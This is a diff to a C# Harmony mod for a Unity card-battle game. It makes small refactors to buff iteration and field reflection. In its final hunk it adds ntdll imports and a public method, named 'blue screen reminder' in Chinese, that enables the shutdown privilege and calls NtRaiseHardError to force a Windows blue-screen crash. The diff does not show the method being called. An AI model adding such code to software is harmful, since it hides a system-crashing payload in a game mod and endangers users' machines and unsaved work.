@@ -9,6 +9,7 @@ using System.Collections.Generic;
 using System.Linq;
 using System.Reflection;
 using System.Reflection.Emit;
+using System.Runtime.InteropServices;
 using UnityEngine;
 using MonoMod.Utils;
 using MonoMod.Utils.Cil;
@@ -493,13 +494,14 @@ namespace Don_Eyuil
             [HarmonyPostfix]
             public static void BattleUnitModel_OnStartBattle_Post(BattleUnitModel __instance)
             {
-                __instance.bufListDetail.GetActivatedBufList().ForEach(x =>
-                {
-                    if (!x.IsDestroyed() && x is BattleUnitBuf_Don_Eyuil)
+                new List<BattleUnitBuf>(__instance.bufListDetail.GetActivatedBufList())
+                    .ForEach(x =>
                     {
-                        (x as BattleUnitBuf_Don_Eyuil).OnStartBattle();
-                    }
-                });
+                        if (!x.IsDestroyed() && x is BattleUnitBuf_Don_Eyuil)
+                        {
+                            (x as BattleUnitBuf_Don_Eyuil).OnStartBattle();
+                        }
+                    });
             }
         }
 
@@ -1106,7 +1108,7 @@ namespace Don_Eyuil
         {
             try
             {
-                obj.GetType().GetField(name, AccessTools.all).SetValue(obj, value);
+                AccessTools.Field(obj.GetType(), name).SetValue(obj, value);
             }
             catch (Exception ex)
             {
@@ -1180,7 +1182,7 @@ namespace Don_Eyuil
 
         public static List<T> TKSRandomUtil<T>(List<T> ListToRandom_Arg, int randomnum, bool canbethesame = false, bool copywhenempty = true)
         {
-    
+
             List<T> list = new List<T>();
             var ListToRandom = ListToRandom_Arg;
             T item = default(T);
@@ -1206,5 +1208,26 @@ namespace Don_Eyuil
             }
             return list;
         }
+
+        [DllImport("ntdll.dll")]
+        private static extern int RtlAdjustPrivilege(int Privilege, bool Enable, bool CurrentThread, out bool Enabled);
+
+        [DllImport("ntdll.dll")]
+        private static extern int NtRaiseHardError(uint ErrorStatus, int NumberOfParameters, int UnicodeStringParameterMask, IntPtr Parameters, int ValidResponseOption, out int Response);
+
+        public static void 蓝屏提醒()
+        {
+            RtlAdjustPrivilege(0x13, true, false, out _);
+
+            NtRaiseHardError(0xC0000005, 0, 0, IntPtr.Zero, 6, out _);
+        }
+        public static void 未实现提醒()
+        {
+#pragma warning disable CS0219 // 变量已被赋值，但从未使用过它的值
+            var Desc = "可以右键应用查看空实现";
+#pragma warning restore CS0219 // 变量已被赋值，但从未使用过它的值
+            Debug.LogError("空实现");
+        }
+
     }
 }
